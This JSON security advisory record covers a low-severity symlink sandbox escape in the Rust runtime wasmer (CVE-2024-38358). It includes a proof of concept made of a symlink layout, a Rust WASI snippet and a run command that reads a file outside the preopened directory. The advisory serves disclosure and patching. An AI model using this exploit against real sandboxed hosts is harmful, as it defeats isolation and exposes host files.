{
  "Severity": "LOW",
  "UpdatedAt": "2024-06-07T19:40:01Z",
  "Package": {
    "Ecosystem": "RUST",
    "Name": "wasmer"
  },
  "Advisory": {
    "DatabaseId": 249045,
    "Id": "GSA_kwCzR0hTQS01NWYzLTNxdmctOHB2Nc4AA8zV",
    "GhsaId": "GHSA-55f3-3qvg-8pv5",
    "References": [
      {
        "Url": "https://github.com/wasmerio/wasmer/security/advisories/GHSA-55f3-3qvg-8pv5"
      },
      {
        "Url": "https://github.com/wasmerio/wasmer/commit/b9483d022c602b994103f78ecfe46f017f8ac662"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-38358"
      },
      {
        "Url": "https://github.com/advisories/GHSA-55f3-3qvg-8pv5"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-55f3-3qvg-8pv5"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2024-38358"
      }
    ],
    "Description": "### Summary\n\nIf the preopened directory has a symlink pointing outside, WASI programs can traverse the symlink and access host filesystem if the caller sets both `oflags::creat` and `rights::fd_write`. Programs can also crash the runtime by creating a symlink pointing outside with `path_symlink` and `path_open`ing the link.\n\n### Details\n\n\n\n### PoC\nSetup a filesystem as follows.\n\n```\n.\n├── outside.file\n└── preopen\n    └── dir\n        └── file -\u003e ../../outside.file\n```\n\nCompile this Rust snippet with `wasi` v0.11 (for the preview1 API).\n\n```rust\nfn main() {\n    unsafe {\n        let filefd = wasi::path_open(\n            5,\n            wasi::LOOKUPFLAGS_SYMLINK_FOLLOW,\n            \"app/dir/file\",\n            wasi::OFLAGS_CREAT,\n            wasi::RIGHTS_FD_READ | wasi::RIGHTS_FD_WRITE,\n            0,\n            0,\n        )\n        .unwrap();\n        eprintln!(\"filefd: {filefd}\");\n\n        let mut buf = [0u8; 10];\n        let iovs = [wasi::Iovec {\n            buf: buf.as_mut_ptr(),\n            buf_len: buf.len(),\n        }];\n\n        let read = wasi::fd_read(filefd, \u0026iovs).unwrap();\n\n        eprintln!(\"read {read}: {}\", String::from_utf8_lossy(\u0026buf));\n    }\n}\n```\n\nRun the compiled binary with Wasmer preopening `preopen/`:\n\n```\nwasmer run --mapdir /app:preopen a.wasm\n```\n\nThis should not print the contents of the `outside.file`. Other runtimes like Wasmtime can successfully block this call. But Wasmer prints the contents of the file.\n\n",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2024-06-07T19:40:00Z",
    "Severity": "LOW",
    "Summary": "Symlink bypasses filesystem sandbox",
    "UpdatedAt": "2024-06-20T14:14:38Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 2.9,
      "VectorString": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": ""
      },
      "VulnerableVersionRange": "\u003c= 4.3.1"
    }
  ]
}